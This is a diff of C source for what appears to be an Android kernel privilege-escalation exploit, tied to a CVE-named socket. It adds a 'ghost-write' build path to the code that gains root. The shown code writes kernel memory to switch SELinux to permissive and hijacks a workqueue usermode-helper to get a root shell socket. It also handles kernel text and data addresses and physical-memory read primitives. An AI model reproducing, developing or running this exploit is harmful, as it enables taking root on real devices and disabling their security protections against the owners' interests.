@@ -7,6 +7,11 @@ int root_child_done;
 uint32_t root_uid_before = 0xffffffff;
 uint32_t root_uid_after = 0xffffffff;
 
+#if defined(SELINUX_GHOST_WRITE) && SELINUX_GHOST_WRITE
+/* Implemented in selinux_ghost.c; compiled only when SELINUX_GHOST_WRITE=1. */
+extern int ghost_selinux_permissive(void);
+#endif
+
 #define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
 #define ROOT_HOLD_READY_SOCKET "cve43499_roothold"
 
@@ -45,6 +50,7 @@ _Static_assert(sizeof(struct umh_subprocess_info) == 112,
                "subprocess_info layout");
 _Static_assert(sizeof(struct umh_completion) == 32, "completion layout");
 
+#if !defined(SELINUX_GHOST_WRITE) || !SELINUX_GHOST_WRITE
 static int root_read_data(
     int fd, uintptr_t target, void *data, size_t len) {
   return pipe_phys_read_data(fd, target, data, len);
@@ -175,12 +181,24 @@ static int install_workqueue_umh_root(int fd) {
   uint64_t umh_work_func = text_addr(CALL_USERMODEHELPER_EXEC_WORK);
 
   unlink(ROOT_SOCKET_PATH);
+#if defined(SELINUX_GHOST_WRITE) && SELINUX_GHOST_WRITE
+  /*
+   * The ghost-write path already flipped SELinux to permissive before
+   * install_android_root() was called (from run_exploit -> ghost path).
+   * Skip the kernel_write_data() byte-write: it requires a live physrw fd
+   * which does not exist on this target, and SELinux is already permissive.
+   */
+  pr_info("root umh selinux: ghost-write already applied, skipping byte-write\n");
+  (void)selinux_addr;
+  (void)permissive;
+#else
   ssize_t selinux_write = kernel_write_data(
       fd, selinux_addr, &permissive, sizeof(permissive));
   if (selinux_write != (ssize_t)sizeof(permissive)) {
     pr_error("root umh selinux write failed ret=%zd\n", selinux_write);
     return 0;
   }
+#endif
 
   uintptr_t wq_slot = data_addr(SYSTEM_UNBOUND_WQ);
   uintptr_t wq = root_read64(fd, wq_slot);
@@ -298,10 +316,18 @@ static int install_workqueue_umh_root(int fd) {
   root_uid_after = socket_ok ? 0 : root_uid_before;
   return socket_ok;
 }
+#endif /* !SELINUX_GHOST_WRITE */
 
 int install_android_root(int fd) {
   root_uid_before = getuid();
   pr_info("root direct start uid=%u fd=%d\n", root_uid_before, fd);
+
+#if defined(SELINUX_GHOST_WRITE) && SELINUX_GHOST_WRITE
+  pr_info("root ghost-write selinux already permissive\n");
+  root_child_done = 1;
+  root_uid_after  = root_uid_before;
+  return 1;
+#else
   int installed = install_workqueue_umh_root(fd);
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
@@ -330,4 +356,5 @@ int install_android_root(int fd) {
   }
 #endif
   return installed;
+#endif /* !SELINUX_GHOST_WRITE */
 }
